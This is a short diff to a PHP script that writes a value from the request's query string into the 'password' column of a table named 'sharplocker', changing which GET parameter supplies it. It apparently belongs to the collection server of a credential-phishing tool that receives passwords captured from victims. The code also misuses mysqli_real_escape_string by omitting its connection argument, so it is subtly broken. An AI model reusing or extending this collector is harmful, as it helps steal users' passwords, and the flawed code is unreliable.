@@ -12,7 +12,7 @@ if (!$conn) {
     die("Connection failed: " . mysqli_connect_error());
 }
 
-$sql = "INSERT INTO data.sharplocker (password) VALUES ('". mysqli_real_escape_string(array_keys($_GET)[0]) ."')";
+$sql = "INSERT INTO data.sharplocker (password) VALUES ('". mysqli_real_escape_string($_GET['p']) ."')";
 
 if ($conn->query($sql) === TRUE) {
     echo "New record created successfully";
